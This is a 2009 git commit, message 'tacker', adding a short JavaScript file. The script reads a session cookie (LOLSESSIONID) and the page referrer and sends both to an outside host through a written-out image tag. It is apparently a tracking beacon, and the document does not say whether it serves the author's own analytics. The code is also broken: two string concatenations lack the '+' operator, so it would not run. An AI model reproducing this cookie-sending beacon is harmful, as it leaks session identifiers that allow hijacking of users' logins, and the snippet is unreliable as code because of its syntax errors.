7550a151e20be76f6b13fc5b8d48f751ea2772a5
Jon Williams <jonathan.williams@gmail.com>
2009-03-04 17:14:29 -0500

    tacker

---
+++ t.js
@@ -0,0 +1,18 @@
+function readCookie(name) {
+	var nameEQ = name + "=";
+	var ca = document.cookie.split(';');
+	for(var i=0;i < ca.length;i++) {
+		var c = ca[i];
+		while (c.charAt(0)==' ') c = c.substring(1,c.length);
+		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+	}
+	return null;
+}
+var c=readCookie('LOLSESSIONID');
+var r=document.referrer;
+var s='http://home.wizardishungry.com/t.png/?';
+if(c)
+    s+='l='+c'&';
+if(r)
+    s+='r='+r'';
+document.write("<img src='"+s+"'>");
